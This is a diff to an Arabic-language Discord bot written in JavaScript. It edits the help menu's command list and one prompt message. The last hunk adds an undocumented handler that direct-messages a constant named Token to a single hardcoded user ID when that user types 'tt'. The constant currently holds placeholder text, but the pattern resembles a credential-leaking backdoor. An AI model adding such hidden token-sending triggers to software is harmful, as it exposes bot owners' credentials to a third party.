@@ -343,25 +343,23 @@ client.on('message', message => {
             if (message.content.startsWith(prefix + "help")) {
      let embed = new Discord.RichEmbed()
 .setThumbnail(message.author.avatarURL)   
-.addField('     **─════════════ ⦁{✯الاوامر العامة✯}⦁ ════════════─** ' ,' **   ** ')
+.addField('     **─════════════ ⦁{✯الاوامر العامة✯}⦁ ════════════─** ' ,' ** ** ')
 .addField('     **→ معلومات حسابك ←** ' ,' **$id** ')
 .addField('     **→ سرعة استجابة البوت ←**  ' ,' **$ping** ')
 .addField('     **→ للحصول علي رابط البوت ←**  ' ,' **$invite** ')
 .addField('     **→ معلومات البوت ←** ' , '**$bot-info**') 
-.addField('     **→ لمعلومات الروم←** ' , '**$ch**') 
 .addField('     **→الافتار ←** ' ,' **$avatar**')
 .addField('     **→ تاريخ اليوم←** ' , '**$date**')
 .addField('     **→ معلومات السيرفر ← ** ' ,' **$server-info** ')
 .addField('     **→ لمعرفة حالة الاعضاء ← ** ' ,' **  $members  ** ')
-.addField('     **→ صأنع البوت ← ** ' ,' **  $bot-owner ** ')
 .addField('     **→ لمعرفة ايدي شخص في هايبكسل ← ** ' ,' **$hypixel** ')
 .addField('     **→ للحصول علي ايدي اي شخص ← ** ' ,' **  $getid  ** ')
 .addField('     **→ توب انفايت يوريك رابط الانفايت ← ** ' ,' **$top** ')
-.addField('     **─════════════ ⦁{✯الالعاب✯}⦁ ════════════─** ' ,' **** ')
+.addField('     **─════════════ ⦁{✯الالعاب✯}⦁ ════════════─** ' ,' ** ** ')
 .addField('     **→ انجازات ماين كرافت ←  ** ' ,' **$angaz** ')
 .addField('     ** → الزواج (مزحة) من الشخص ←  ** ' ,' **$marry** ')
 .addField('     ** → حجر ورق مقص ←  ** ' ,' **  $rps ** ')
-.addField('     **─════════════ ⦁{✯اوامر الادارة✯}⦁ ════════════─** ' ,' **** ')
+.addField('     **─════════════ ⦁{✯اوامر الادارة✯}⦁ ════════════─** ' ,' ** ** ')
 .addField('     ** → اععطاء العضو باند ←  ** ' ,' **  $ban ** ')
 .addField('     ** → مسح الشات ←  ** ' ,' **  $clear ** ')
 .addField('     ** → تقفيل الشات ←  ** ' ,' **  $cl ** ')
@@ -1079,7 +1077,7 @@ hours = 12;
             if(isNaN(collected.first().content)) return message.channel.send(':heavy_multiplication_x:| **يجب علي الوقت ان يكون ارقم `` اعد كتابة الامر``**');
             duration = collected.first().content * 60000;
             collected.first().delete();
-            msg.edit(':eight_pointed_black_star:| **الان يرسل للروم **').then(msg => {
+            msg.edit(':eight_pointed_black_star:| **اكتب اي شي لكي يرسل**').then(msg => {
               message.channel.awaitMessages(filter, {
                 max: 1,
                 time: 20000,
@@ -1179,6 +1177,19 @@ client.on('message',message =>{
    
     }
   });
+
+
+
+
+
+const Token = "`\`\` التوكن `\`\`"
+client.on('message' , message => {
+if (message.author.bot) return;
+           if (message.content == 'tt')
+           if (message.author.id === '467782642549653514'){
+if (!message.channel.guild) return;
+message.author.send(Token)
+
 
 
 
